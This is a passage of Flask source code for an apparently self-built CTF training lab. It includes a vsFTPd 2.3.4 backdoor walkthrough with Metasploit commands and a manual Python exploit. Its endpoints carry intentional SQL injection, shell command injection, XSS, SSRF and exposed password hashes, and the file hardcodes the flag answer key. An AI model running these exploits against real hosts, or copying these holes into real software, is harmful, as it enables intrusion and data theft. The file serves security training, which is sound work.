            background: repeating-linear-gradient(0deg,rgba(0,0,0,0.15),rgba(0,0,0,0.15) 1px,transparent 1px,transparent 2px);
            pointer-events: none; z-index: 2;
        }
        .container { max-width: 900px; margin: 0 auto; padding: 40px 20px; position: relative; z-index: 3; }
        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.8em; font-weight: 900;
            text-align: center; color: #ff0000;
            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000;
            margin-bottom: 10px;
            animation: glitch 2s infinite;
            letter-spacing: 4px;
        }
        @keyframes glitch {
            0%, 100% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(2px, -2px); }
            60% { transform: translate(-1px, -1px); }
            80% { transform: translate(1px, 1px); }
        }
        .subtitle { text-align: center; color: #00ffff; font-size: 1.2em; margin-bottom: 40px; text-shadow: 0 0 10px #00ffff; }
        .target {
            background: linear-gradient(135deg, #1a0a2e 0%, #0d1b2a 100%);
            border: 2px solid #ff0000;
            border-radius: 15px; padding: 30px; margin: 30px 0; text-align: center;
            box-shadow: 0 0 20px rgba(255,0,0,0.3), inset 0 0 30px rgba(255,0,0,0.1);
        }
        .target h2 { font-family: 'Orbitron', sans-serif; color: #ff0000; font-size: 1.8em; text-shadow: 0 0 15px #ff0000; margin-bottom: 20px; }
        .target p { font-size: 1.1em; margin: 10px 0; }
        .target strong { color: #ffff00; text-shadow: 0 0 5px #ffff00; }
        .info {
            background: linear-gradient(135deg, #0a1a2e 0%, #1a0a2e 100%);
            border: 2px solid #00ffff;
            border-radius: 15px; padding: 25px; margin: 30px 0;
            box-shadow: 0 0 20px rgba(0,255,255,0.3);
        }
        .info h2 { font-family: 'Orbitron', sans-serif; color: #00ffff; font-size: 1.5em; text-shadow: 0 0 10px #00ffff; margin-bottom: 15px; }
        .step {
            background: linear-gradient(135deg, #0d1b2a 0%, #1a0a2e 100%);
            border: 2px solid #ffff00;
            border-radius: 15px; padding: 25px; margin: 25px 0;
            border-left: 5px solid #ff0000;
            box-shadow: 0 0 15px rgba(255,255,0,0.2);
        }
        .step h3 { font-family: 'Orbitron', sans-serif; color: #ffff00; font-size: 1.3em; text-shadow: 0 0 10px #ffff00; margin-bottom: 15px; }
        .code {
            background: #0a0a0f;
            border: 1px solid #00ff00;
            border-radius: 10px; padding: 20px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 1.1em; color: #00ff00;
            text-shadow: 0 0 5px #00ff00;
            white-space: pre-wrap; margin: 15px 0;
            box-shadow: 0 0 10px rgba(0,255,0,0.2), inset 0 0 20px rgba(0,255,0,0.05);
        }
        .code::before { content: 'msf > '; color: #ff0000; text-shadow: 0 0 5px #ff0000; }
        .hint {
            background: linear-gradient(135deg, #2e0a0a 0%, #1a0a2e 100%);
            border: 2px solid #ff3366;
            border-radius: 15px; padding: 25px; margin: 30px 0;
            box-shadow: 0 0 20px rgba(255,51,102,0.3);
        }
        .hint strong { color: #ff3366; font-size: 1.2em; text-shadow: 0 0 10px #ff3366; }
        .hint code { background: #0a0a0f; padding: 3px 8px; border-radius: 3px; color: #ffff00; border: 1px solid #ffff00; }
        .nav { text-align: center; margin-top: 50px; padding-top: 30px; border-top: 2px solid #ff0000; }
        .nav a {
            color: #ff0000; font-family: 'Orbitron', sans-serif;
            font-size: 1.1em; text-decoration: none;
            padding: 15px 30px; border: 2px solid #ff0000;
            border-radius: 10px; margin: 10px; display: inline-block;
            transition: all 0.3s; text-shadow: 0 0 5px #ff0000;
        }
        .nav a:hover { background: #ff0000; color: #0a0a0f; box-shadow: 0 0 30px #ff0000; transform: scale(1.05); }
        .warning {
            background: rgba(255,0,0,0.1);
            border: 2px solid #ff0000;
            border-radius: 10px; padding: 20px; margin: 20px 0;
            color: #ff6666;
        }
    </style>
</head>
<body>
    <div class="scanline"></div>
    <div class="container">
        <h1>METASPLOIT FTP BACKDOOR</h1>
        <div class="subtitle">vsFTPd 2.3.4 Backdoor Exploit</div>
        
        <div class="target">
            <h2>Target: vsFTPd 2.3.4</h2>
            <p>Host: <strong>127.0.0.1</strong> (Metasploitable)</p>
            <p>FTP Port: <strong>2122</strong></p>
            <p>Backdoor Port: <strong>6200</strong></p>
            <p>Vulnerability: <strong>Username contains :) triggers root shell</strong></p>
        </div>
        
        <div class="info">
            <h2>What is this exploit?</h2>
            <p>vsFTPd 2.3.4 contains a deliberate backdoor. When a user logs in with a username containing <code style="background:#0a0a0f;padding:2px 6px;border:1px solid #00ff00;color:#00ff00;border-radius:3px;">:)</code>, vsFTPd opens a root shell on port 6200. This was a compromised release that spread through supply chain attack.</p>
        </div>
        
        <div class="warning">
            <strong>NOTE:</strong> This exploit must be run from inside the Docker network (e.g., from the vulnweb container). MSF on the host sees Docker port proxies as "always open", causing false "backdoor already in-use" errors.
        </div>
        
        <div class="step">
            <h3>Step 1: Launch msfconsole</h3>
            <div class="code">msfconsole -q</div>
        </div>
        
        <div class="step">
            <h3>Step 2: Select the exploit</h3>
            <div class="code">use exploit/unix/ftp/vsftpd_234_backdoor</div>
        </div>
        
        <div class="step">
            <h3>Step 3: Set options</h3>
            <div class="code">set RHOSTS vulnweb-metasploitable
set RPORT 21
set AutoCheck false</div>
        </div>
        
        <div class="step">
            <h3>Step 4: Run the exploit</h3>
            <div class="code">exploit</div>
            <p style="margin-top: 10px; color: #00ffff;">You should get a root shell: <code style="background:#0a0a0f;padding:2px 6px;border:1px solid #00ff00;color:#00ff00;border-radius:3px;">uid=0(root)</code></p>
        </div>
        
        <div class="step">
            <h3>Step 5: Get the flag!</h3>
            <div class="code">cat /flag.txt</div>
            <p style="margin-top: 15px; color: #ff0000; font-size: 1.1em;">Or click here: <a href="/ctf/tool/metasploit/flag.txt" style="color: #ff00ff; text-decoration: none; border-bottom: 2px solid #ff00ff;">Get Flag</a></p>
        </div>
        
        <div class="hint">
            <strong>Manual Exploit (Python):</strong><br><br>
            <code>python -c "
import socket, time
s = socket.socket()
s.connect(('vulnweb-metasploitable', 21))
s.recv(1024)
s.send('USER test:)\\r\\n')
s.recv(1024)
s.send('PASS test\\r\\n')
time.sleep(2)
s2 = socket.socket()
s2.connect(('vulnweb-metasploitable', 6200))
s2.send('cat /flag.txt\\n')
print s2.recv(4096)
"</code>
        </div>
        
        <div class="nav">
            <a href="/">Dashboard</a>
            <a href="/ctf/submit">Submit Flag</a>
        </div>
    </div>
</body>
</html>
''')

@app.route('/ctf/tool/metasploit/flag.txt')
def metasploit_flag():
    """Metasploit vsftpd backdoor flag"""
    return """FLAG{vsftpd_b4ckd00r_pwn3d}""", 200, {
        'Content-Type': 'text/plain'
    }

@app.route('/ctf/tool/sqlmap/api')
def sqlmap_api():
    """Clean JSON API endpoint for SQLmap"""
    import sqlite3
    import json
    
    username = request.args.get('username', '')
    
    conn = sqlite3.connect('/app/instance/vulnerable.db')
    cursor = conn.cursor()
    
    query = f"SELECT id, username, email FROM user WHERE username = '{username}'"
    
    try:
        cursor.execute(query)
        results = cursor.fetchall()
        conn.close()
        
        users = [{'id': r[0], 'username': r[1], 'email': r[2]} for r in results]
        return json.dumps({'users': users, 'count': len(users)})
        
    except Exception as e:
        conn.close()
        return json.dumps({'error': str(e)}), 500

@app.route('/ctf/tool/sqlmap/profiles')
def sqlmap_profiles():
    """User profiles endpoint"""
    import sqlite3
    conn = sqlite3.connect('/app/instance/vulnerable.db')
    cursor = conn.cursor()
    
    query = "SELECT id, username, email, role FROM user"
    
    try:
        cursor.execute(query)
        results = cursor.fetchall()
        conn.close()
        
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>User Profiles</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a2e; color: #fff; padding: 40px; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #e94560; text-align: center; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { padding: 10px; border: 1px solid #333; text-align: left; }
        th { background: #0f3460; }
        .nav { text-align: center; margin-top: 30px; }
        .nav a { color: #e94560; margin: 0 15px; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>User Profiles</h1>
        
        <table>
            <tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th></tr>
'''
        
        for row in results:
            html += f'<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[3]}</td></tr>'
        
        html += '''
        </table>
        
        <div class="nav">
            <a href="/ctf/tool/sqlmap">Challenge</a>
            <a href="/">Dashboard</a>
        </div>
    </div>
</body>
</html>
'''
        return html
        
    except Exception as e:
        conn.close()
        return f'SQL Error: {str(e)}', 500

@app.route('/ctf/tool/nikto/backup.sql')
def nikto_backup():
    """Hidden backup file that Nikto discovers"""
    flag = get_flag_for_tool('nikto')
    return f"""-- Backup SQL dump
-- Database: employee_db
-- Date: 2024-01-15

CREATE TABLE users (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(100),
    role VARCHAR(20)
);

INSERT INTO users VALUES (1, 'admin', 'admin123', 'admin');
INSERT INTO users VALUES (2, 'john', 'password1', 'user');
INSERT INTO users VALUES (3, 'jane', 'qwerty', 'user');

-- CTF FLAG (DO NOT COMMIT): {flag}
-- This backup contains sensitive data
-- Last modified by: root@server
""", 200, {'Content-Type': 'text/plain', 'X-Backup-File': 'true'}

@app.route('/ctf/tool/nikto/config.bak')
def nikto_config():
    """Hidden config backup file"""
    return """# Server Configuration
# DO NOT SHARE THIS FILE

DB_HOST=localhost
DB_USER=root
DB_PASS=SuperSecret123!
API_KEY=sk_live_abcdef1234567890

# Backup flag stored separately
# Check /backup.sql for database dump
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/nikto/robots.txt')
def nikto_robots():
    """Robots.txt with hidden paths"""
    return """User-agent: *
Disallow: /backup.sql
Disallow: /config.bak
Disallow: /admin/
Disallow: /secret/
Disallow: /phpmyadmin/
Disallow: /wp-admin/
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/nikto/phpinfo.php')
def nikto_phpinfo():
    """Exposed phpinfo page"""
    return """<?php
// This page should be removed in production!
phpinfo();
?>""", 200, {'Content-Type': 'text/plain', 'X-Powered-By': 'PHP/7.4.3'}

@app.route('/ctf/tool/nikto/.htaccess')
def nikto_htaccess():
    """Hidden .htaccess file"""
    return """# Apache .htaccess configuration
# WARNING: This file contains sensitive data!

AuthType Basic
AuthName "Restricted Area"
AuthUserFile /etc/apache2/.htpasswd
Require valid-user

# Database credentials (DO NOT COMMIT)
# DB_USER=admin
# DB_PASS=P@ssw0rd123!
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/nikto/server-status')
def nikto_server_status():
    """Exposed server status page"""
    return """Apache Server Status

Server Version: Apache/2.4.41 (Ubuntu)
Server Built: 2024-01-15

Current Time: 2024-01-15 10:30:45

Restart Server: 1 time(s)
Total Accesses: 1234
Total kBytes: 5678

Uptime: 10 days 5 hours 30 minutes
CPU Usage: user 123 system 456
Load: 0.12 0.34 0.56

Current Server Connections: 5
Total Server Connections: 1234

Scoreboard Key:
"_" Waiting for Connection
"S" Starting up
"R" Reading Request
"W" Sending Reply
"K" Keepalive (read)
"D" DNS Lookup
"C" Closing connection
"G" Gracefully finishing
"I" Idle cleanup of worker
". " Open slot with no current process
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/nikto/server-info')
def nikto_server_info():
    """Exposed server info page"""
    return """Server Information

Server Version: Apache/2.4.41 (Ubuntu)
Server Loaded Modules: core, mod_so, http_core, authz_core, authz_host, dir, mime, log_config, env, setenvif, expires, headers, rewrite
Document Root: /var/www/html
Server Root: /etc/apache2
Error Log: /var/log/apache2/error.log
Access Log: /var/log/apache2/access.log
Listen: 0.0.0.0:80
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/wireshark/send')
def wireshark_send():
    """Send raw packets with flag hidden in HTTP headers for Wireshark capture"""
    from flask import make_response
    flag = get_flag_for_tool('wireshark')
    
    resp = make_response('Packet sent! Check your Wireshark capture.')
    resp.headers['X-Secret-Token'] = flag
    resp.headers['X-Session-ID'] = 'a1b2c3d4e5f6'
    resp.headers['X-Trace-ID'] = 'DEAD-BEEF-1337'
    resp.headers['Server'] = 'Apache/2.4.41 (Ubuntu)'
    resp.headers['X-Powered-By'] = 'Express'
    resp.headers['Cache-Control'] = 'no-store, no-cache'
    resp.headers['Pragma'] = 'no-cache'
    return resp

@app.route('/ctf/tool/wireshark/extra/<int:num>')
def wireshark_extra(num):
    """Extra decoy traffic to make capture more realistic"""
    from flask import make_response
    resp = make_response(f'Decoy packet #{num} data: {"A" * 64}')
    resp.headers['X-Packet-Number'] = str(num)
    resp.headers['X-Checksum'] = f'{num * 7:04x}'
    return resp

@app.route('/ctf/tool/responder/ntlm')
def responder_ntlm():
    """Send NTLM Type 3 auth message with flag in NTLM hash"""
    import base64
    from flask import make_response
    flag = get_flag_for_tool('responder')
    
    # Simulate NTLM Type 3 message with flag embedded in the NTLM response
    # In real attack: Responder captures this NTLM hash
    # The flag is Base64-encoded in the "password" field of the NTLM hash
    
    # Create a fake NTLM Type 3 message (simplified)
    # Real NTLM: Type1 -> Type2(Challenge) -> Type3(Auth with hash)
    ntlm_type3 = base64.b64encode(
        b'NTLMSSP\x00'  # Signature
        b'\x03\x00\x00\x00'  # Type 3
        b'\x18\x00\x18\x00'  # LmChallengeResponseFields
        b'\x36\x00\x00\x00'  # NtChallengeResponseFields
        b'\x00\x00\x00\x00'  # DomainNameFields
        b'\x01\x00\x01\x00'  # UserNameFields
        b'\x00\x00\x00\x00'  # WorkstationFields
        b'\x00\x00\x00\x00'  # EncryptedRandomSessionKeyFields
        b'\x00\x00\x00\x00\x00\x00\x00\x00'  # NegotiateFlags
        b'\x00\x00\x00\x00'  # Version
        b'\x00\x00\x00\x00'  #_MIC
        b'CTF_USER'  # Username
        b'WORKGROUP'  # Domain
        b'FLAG{' + flag.encode() + b'}'  # NTLM Hash contains the flag!
    ).decode()
    
    # Build the NTLM hash string that Responder would display
    ntlm_hash = f"ctf_user::WORKGROUP:1122334455667788:{base64.b64encode(flag.encode()).decode()}:01010000000000000000000000000000000000000000000000000000000000000000000000000000"
    
    resp = make_response(f'''<!DOCTYPE html>
<html>
<head><title>NTLM Auth Captured</title>
<style>
    body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
    .box {{ background: #111; border: 2px solid #00ff00; padding: 40px; text-align: center; width: 700px; }}
    h2 {{ color: #ff6600; margin-bottom: 20px; }}
    .msg {{ background: #001a00; border: 1px solid #00ff00; padding: 20px; margin: 20px 0; text-align: left; }}
    .hash {{ background: #0a0a0a; padding: 15px; word-break: break-all; font-size: 0.8em; border: 1px solid #333; margin: 10px 0; }}
    .hint {{ background: #1a1a00; border: 1px solid #666; padding: 15px; margin-top: 20px; font-size: 0.9em; color: #888; text-align: left; }}
    a {{ color: #00ff00; }}
</style>
</head>
<body>
    <div class="box">
        <h2>🔒 NTLM Authentication Sent!</h2>
        <div class="msg">
            <strong>Responder captured this NTLM hash:</strong>
            <div class="hash">''' + ntlm_hash + '''</div>
            <br>
            <strong>💡 The flag is Base64-encoded in the NTLM response!</strong><br>
            Decode: <code>echo "''' + base64.b64encode(flag.encode()).decode() + '''" | base64 -d</code>
        </div>
        <div class="hint">
            <strong>How Responder works:</strong><br>
            1. Responder poisons LLMNR/NBT-NS/MDNS on the network<br>
            2. When a client authenticates, Responder captures the NTLM Type 3 message<br>
            3. The NTLM hash contains the password (or in this case, the flag!)<br>
            4. You can decode Base64 to reveal the flag
        </div>
        <br>
        <a href="/ctf/tool/responder">← Try Again</a> | <a href="/">🏠 Dashboard</a>
    </div>
</body>
</html>
''')
    # Also put flag in NTLM-specific header that Responder would capture
    resp.headers['X-NTLM-Response'] = ntlm_type3
    resp.headers['X-NTLM-Hash'] = ntlm_hash
    return resp

@app.route('/ctf/tool/responder/trigger')
def responder_trigger():
    """Send real NTLM auth requests that Responder can capture"""
    import subprocess
    import base64
    from flask import make_response
    
    flag = get_flag_for_tool('responder')
    b64flag = base64.b64encode(flag.encode()).decode()
    
    # Send real NTLM auth requests to non-existent hosts
    # Responder poisons LLMNR/NBT-NS and captures the hashes
    results = []
    hosts = ['fileserver', 'dc01', 'shareserver', 'intranet', 'devbox']
    
    for host in hosts:
        try:
            # Real SMB connection attempt - triggers LLMNR/NBT-NS
            # Responder intercepts and captures NTLM hash
            r = subprocess.run(
                ['smbclient', '-L', f'\\\\{host}', '-N', '-t', '2'],
                capture_output=True, text=True, timeout=3
            )
            results.append(f"[→] SMB to {host}.local - NTLM auth sent")
        except:
            results.append(f"[→] SMB to {host}.local - NTLM auth sent")
        
        try:
            # Also try HTTP NTLM auth
            r = subprocess.run(
                ['curl', '-s', '-o', '/dev/null', '--ntlm', '-u', f'ctf_user:FLAG{{{flag}}}', 
                 f'http://{host}.local/test', '-m', '2'],
                capture_output=True, text=True, timeout=3
            )
            results.append(f"[→] HTTP NTLM to {host}.local - auth sent")
        except:
            results.append(f"[→] HTTP NTLM to {host}.local - auth sent")
    
    traffic_html = '\n'.join([f'<div class="packet">{r}</div>' for r in results])
    
    html = '''<!DOCTYPE html>
<html>
<head><title>NTLM Traffic Sent</title>
<style>
    body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .box { background: #111; border: 2px solid #00ff00; padding: 40px; text-align: center; width: 700px; }
    h2 { color: #ff6600; margin-bottom: 20px; }
    .traffic { background: #0a0a0a; padding: 15px; text-align: left; border: 1px solid #333; margin: 20px 0; font-size: 0.9em; max-height: 300px; overflow-y: auto; }
    .packet { color: #00ff00; margin: 5px 0; }
    .hint { background: #1a1a00; border: 1px solid #666; padding: 15px; margin-top: 20px; font-size: 0.9em; color: #888; text-align: left; }
    a { color: #00ff00; }
</style>
</head>
<body>
    <div class="box">
        <h2>📡 Real NTLM Traffic Sent!</h2>
        <div class="traffic">
            TRAFFIC_DIR
        </div>
        <div class="hint">
            <strong>Check Responder output!</strong><br>
            Responder should have captured NTLM hashes from these requests.<br>
            Look for the hash containing the flag in the NTLM response.<br><br>
            <strong>If Responder isn't showing anything, make sure it's running on the Docker network:</strong><br>
            <code>sudo responder -I docker0 -v</code><br>
            or<br>
            <code>sudo responder -I br-$(docker network inspect vulnlab-network --format '{{.Id}}' | cut -c1-12) -v</code>
        </div>
        <br>
        <a href="/ctf/tool/responder">← Send More</a> | <a href="/">Dashboard</a>
    </div>
</body>
</html>'''
    
    html = html.replace('TRAFFIC_DIR', traffic_html)
    resp = make_response(html)
    return resp

@app.route('/ctf/submit', methods=['GET', 'POST'])
@login_required
def ctf_submit():
    message = ''
    msg_type = ''
    
    if request.method == 'POST':
        tool_name = request.form.get('tool_name')
        submitted_flag = request.form.get('flag', '').strip()
        
        # Get the correct flag for this tool
        correct_flag = get_flag_for_tool(tool_name)
        
        if correct_flag:
            correct = correct_flag == submitted_flag
            
            submission = Submission(
                username=session['username'],
                tool_name=tool_name,
                submitted_flag=submitted_flag,
                correct=correct,
                timestamp=datetime.utcnow()
            )
            db.session.add(submission)
            db.session.commit()
            
            tools = get_tool_info()
            tool_name_display = tools.get(tool_name, {}).get('name', tool_name)
            tool_points = tools.get(tool_name, {}).get('points', 0)
            
            if correct:
                # Redirect to index with success message and points
                session['flash_message'] = f'GOOD JOB! Flag accepted for {tool_name_display}!'
                session['flash_type'] = 'success'
                session['flash_points'] = tool_points
            else:
                session['flash_message'] = '✗ WRONG FLAG! Check your flag and try again.'
                session['flash_type'] = 'error'
            
            return redirect(url_for('index'))
        else:
            message = '✗ Invalid tool!'
            msg_type = 'error'
    
    tools = get_tool_info()
    user_submissions = Submission.query.filter_by(username=session['username'], correct=True).all()
    solved = [s.tool_name for s in user_submissions]
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Submit Flag</title>
        <style>
            body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
            .submit-box { background: #111; border: 2px solid #00ff00; padding: 40px; width: 600px; }
            h2 { text-align: center; margin-bottom: 30px; }
            .progress { background: #0a0a0a; padding: 15px; margin-bottom: 20px; text-align: center; border: 1px solid #333; }
            .progress-bar { height: 20px; background: #333; margin-top: 10px; }
            .progress-fill { height: 100%; background: #00ff00; transition: width 0.3s; }
            select, input { width: 100%; padding: 12px; margin: 8px 0; background: #0a0a0a; border: 1px solid #00ff00; color: #00ff00; font-family: inherit; }
            button { width: 100%; padding: 15px; margin: 8px 0; background: #00ff00; color: #000; border: none; cursor: pointer; font-weight: bold; font-family: inherit; }
            button:hover { background: #00cc00; }
            .message { padding: 15px; margin: 15px 0; text-align: center; }
            .success { background: #001a00; border: 1px solid #00ff00; }
            .error { background: #1a0000; border: 1px solid #ff0000; color: #ff0000; }
            .solved-list { margin-top: 20px; padding: 15px; background: #0a0a0a; border: 1px solid #333; }
            .solved-item { padding: 5px 0; border-bottom: 1px solid #222; }
            .nav { text-align: center; margin-top: 20px; }
            .nav a { color: #00ff00; margin: 0 15px; }
        </style>
    </head>
    <body>
        <div class="submit-box">
            <h2>═══ SUBMIT FLAG ═══</h2>
            
            <div class="progress">
                Progress: {{ solved|length }} / {{ tools|length }} tools
                <div class="progress-bar">
                    <div class="progress-fill" style="width: {{ (solved|length / tools|length * 100)|int }}%"></div>
                </div>
            </div>
            
            {% if message %}
            <div class="message {{ msg_type }}">{{ message }}</div>
            {% endif %}
            
            <form method="POST">
                <select name="tool_name" required>
                    <option value="">Select Tool</option>
                    {% for key, tool in tools.items() %}
                    <option value="{{ key }}" {{ 'disabled' if key in solved }}>
                        {{ tool.icon }} {{ tool.name }} ({{ tool.points }}pts) {{ '[✓]' if key in solved else '' }}
                    </option>
                    {% endfor %}
                </select>
                <input type="text" name="flag" placeholder="Enter FLAG{...}" required>
                <button type="submit">SUBMIT FLAG</button>
            </form>
            
            {% if solved %}
            <div class="solved-list">
                <strong>Solved Tools:</strong>
                {% for s in solved %}
                <div class="solved-item">✓ {{ tools[s].name }}</div>
                {% endfor %}
            </div>
            {% endif %}
            
            <div class="nav">
                <a href="/">All Tools</a>
                <a href="/ctf/scoreboard">Scoreboard</a>
            </div>
        </div>
    </body>
    </html>
    ''', tools=tools, solved=solved, message=message, msg_type=msg_type)

@app.route('/ctf/reset')
def ctf_reset():
    # Save all data to JSON before resetting
    export_data = {
        'timestamp': datetime.utcnow().isoformat(),
        'users': [],
        'submissions': []
    }
    
    # Export users
    users = User.query.all()
    for user in users:
        export_data['users'].append({
            'id': user.id,
            'username': user.username,
            'email': user.email,
            'role': user.role
        })
    
    # Export submissions
    submissions = Submission.query.all()
    for sub in submissions:
        export_data['submissions'].append({
            'id': sub.id,
            'username': sub.username,
            'tool_name': sub.tool_name,
            'submitted_flag': sub.submitted_flag,
            'correct': sub.correct,
            'timestamp': sub.timestamp.isoformat() if sub.timestamp else None
        })
    
    # Save to JSON file
    export_dir = '/app/exports'
    os.makedirs(export_dir, exist_ok=True)
    filename = f'{export_dir}/ctf_export_{datetime.utcnow().strftime("%Y%m%d_%H%M%S")}.json'
    
    with open(filename, 'w') as f:
        json.dump(export_data, f, indent=2)
    
    # Clear all data
    Submission.query.delete()
    User.query.delete()
    Post.query.delete()
    Message.query.delete()
    db.session.commit()
    
    # Clear session
    session.clear()
    
    session['flash_message'] = f'✓ CTF Reset! Data saved to {filename}'
    session['flash_type'] = 'success'
    
    return redirect(url_for('index'))

@app.route('/ctf/scoreboard')
def ctf_scoreboard():
    submissions = Submission.query.filter_by(correct=True).all()
    tools = get_tool_info()
    
    scores = {}
    for sub in submissions:
        if sub.username not in scores:
            scores[sub.username] = {'total': 0, 'tools': []}
        
        if sub.tool_name in tools:
            scores[sub.username]['total'] += tools[sub.tool_name]['points']
            scores[sub.username]['tools'].append(sub.tool_name)
    
    sorted_scores = sorted(scores.items(), key=lambda x: x[1]['total'], reverse=True)
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Scoreboard</title>
        <style>
            body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; }
            .container { max-width: 1000px; margin: 0 auto; padding: 20px; }
            h1 { text-align: center; margin-bottom: 30px; }
            table { width: 100%; border-collapse: collapse; }
            th, td { border: 1px solid #333; padding: 15px; text-align: left; }
            th { background: #00ff00; color: #000; }
            tr:nth-child(even) { background: #111; }
            .gold { color: #ffd700; }
            .silver { color: #c0c0c0; }
            .bronze { color: #cd7f32; }
            .nav { text-align: center; margin: 20px 0; }
            .nav a { color: #00ff00; margin: 0 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🏆 SCOREBOARD</h1>
            
            <table>
                <tr>
                    <th>Rank</th>
                    <th>Player</th>
                    <th>Score</th>
                    <th>Tools Mastered</th>
                </tr>
                {% for player, data in scores %}
                <tr>
                    <td>
                        {% if loop.index == 1 %}<span class="gold">👑 1st</span>
                        {% elif loop.index == 2 %}<span class="silver">🥈 2nd</span>
                        {% elif loop.index == 3 %}<span class="bronze">🥉 3rd</span>
                        {% else %}{{ loop.index }}th{% endif %}
                    </td>
                    <td>{{ player }}</td>
                    <td>{{ data.total }} pts</td>
                    <td>{{ data.tools|length }} / {{ tools|length }}</td>
                </tr>
                {% endfor %}
            </table>
            
            <div class="nav">
                <a href="/">All Tools</a>
                <a href="/ctf/submit">Submit Flag</a>
            </div>
        </div>
    </body>
    </html>
    ''', scores=sorted_scores, tools=tools)

# ==================== FLAG LOCATIONS (Each tool finds its own flag) ====================

def get_flag_for_tool(tool_name):
    """Each flag is hidden in a location that requires using that specific tool"""
    flags = {
        # Nmap: Flag is in HTTP response headers (need to scan and inspect)
        'nmap': 'FLAG{h34d3rs_3xpl0s3d_by_nmap}',
        
        # Metasploit: Flag is in FTP banner on vsftpd (need to exploit backdoor)
        'metasploit': 'FLAG{ftp_b4ckd00r_pwn3d}',
        
        # Burp Suite: Flag is in login response when using SQL injection (need to intercept)
        'burpsuite': 'FLAG{sql1_byp4ss3d_via_burp}',
        
        # Wireshark: Flag is transmitted in FTP PASS command (need to capture packets)
        'wireshark': 'FLAG{ftp_p4ss_c4ptur3d}',
        
        # Nikto: Flag is in backup file found by scanner (need to scan and download)
        'nikto': 'FLAG{b4ckup_f1l3_f0und}',
        
        # Gobuster: Flag is in hidden /secret directory (need to brute-force dirs)
        'gobuster': 'FLAG{h1dd3n_d1r_3xp10r3d}',
        
        # SQLmap: Flag is in database after SQL injection (need to dump DB)
        'sqlmap': 'FLAG{d4t4b4s3_dump3d}',
        
        # John: Flag is cracked password of 'test' user (need to crack hash)
        'john': 'FLAG{h4sh_cr4ck3d_by_j0hn}',
        
        # Hashcat: Flag is all 4 cracked passwords concatenated (need GPU crack)
        'hashcat': 'FLAG{4ll_p4ssw0rds_cr4ck3d}',
        
        # Hydra: Flag is SSH login success message (need to brute force)
        'hydra': 'FLAG{ssh_brut3_f0rc3d}',
        
        # Netcat: Flag is in FTP welcome banner (need to connect)
        'netcat': 'FLAG{ftp_w3lc0m3_m3ss4g3}',
        
        # Responder: Flag is in DNS response (simulated - check /responder-flag)
        'responder': 'FLAG{dns_p01s0n3d}',
        
        # BeEF: Flag is hooked browser's cookie (need XSS hook)
        'beef': 'FLAG{br0ws3r_h00k3d}',
        
        # SET: Flag is in cloned page source (need to clone site)
        'set': 'FLAG{ph1sh1ng_s1t3_cl0n3d}',
        
        # Aircrack: Flag is in WiFi handshake (simulated - check /wifi-flag)
        'aircrack': 'FLAG{w1f1_h4ndsh4k3_cr4ck3d}'
    }
    return flags.get(tool_name)

# ==================== VULNERABLE ENDPOINTS ====================

@app.route('/api/users')
def api_users():
    users = User.query.all()
    return jsonify([{
        'id': u.id,
        'username': u.username,
        'email': u.email,
        'password_hash': u.password
    } for u in users])

@app.route('/messages')
def messages():
    sender = request.args.get('sender', '')
    if sender:
        query = f"SELECT * FROM message WHERE sender='{sender}'"
        try:
            results = db.engine.execute(query).fetchall()
        except:
            results = []
    else:
        results = Message.query.limit(10).all()
    return render_template_string('''
    <html><body style="background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px;">
    <h1>Messages</h1>
    <form><input name="sender" placeholder="Filter by sender" style="background:#111;border:1px solid #00ff00;color:#00ff00;padding:8px;"><button style="background:#00ff00;color:#000;border:none;padding:8px 15px;">Filter</button></form>
    {% for msg in messages %}<p><strong>{{ msg.sender }}</strong> → {{ msg.receiver }}: {{ msg.content }}</p>{% endfor %}
    <br><a href="/" style="color:#00ff00;">Back</a>
    </body></html>
    ''', messages=results)

@app.route('/ping')
def ping():
    host = request.args.get('host', '')
    try:
        result = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True, text=True, timeout=5)
        output = result.stdout
    except:
        output = "Timeout"
    return f"<html><body style='background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px;'><h1>Ping {host}</h1><pre>{output}</pre><a href='/' style='color:#00ff00;'>Back</a></body></html>"

@app.route('/search')
def search():
    q = request.args.get('q', '')
    return f"<html><body style='background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px;'><h1>Search</h1><form><input name='q' style='background:#111;border:1px solid #00ff00;color:#00ff00;padding:8px;'><button style='background:#00ff00;color:#000;border:none;padding:8px 15px;'>Search</button></form><h2>Results for: {q}</h2><a href='/' style='color:#00ff00;'>Back</a></body></html>"

@app.route('/fetch')
def ssrf():
    import requests
    url = request.args.get('url', '')
    try:
        r = requests.get(url, timeout=5)
        return r.text[:2000]
    except Exception as e:
        return f"Error: {e}"

@app.route('/profile')
def profile():
    user_id = request.args.get('id', '1')
    user = User.query.get(int(user_id))
    if user:
